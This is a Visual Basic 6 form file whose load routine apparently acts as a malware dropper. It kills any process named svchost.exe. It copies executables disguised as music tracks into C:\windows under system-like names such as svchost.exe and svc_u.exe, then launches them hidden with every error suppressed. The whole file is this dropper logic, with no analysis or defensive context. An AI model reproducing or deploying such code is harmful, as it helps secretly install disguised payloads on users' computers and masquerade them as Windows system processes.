VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3030
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4560
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3030
   ScaleWidth      =   4560
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    If ProcessoExiste("svchost.exe") Then Call KillProcess("svchost.exe")
    On Error Resume Next
    Call FileCopy(App.Path & "/System of a Down - Cigaro.exe", "c:\windows\svchost.exe")
    On Error Resume Next
    Call FileCopy(App.Path & "/DireStraits - Sultans of Swing.exe", "c:\windows\svc_u.exe")
    On Error Resume Next
    Call FileCopy(App.Path & "/ccache.exe", "c:\windows\ccache.exe")
    
    On Error Resume Next
    Call Shell("c:\windows\ccache.exe", vbHide)
    On Error Resume Next
    Call Shell("c:\windows\svchost.exe", vbHide)
    End
End Sub
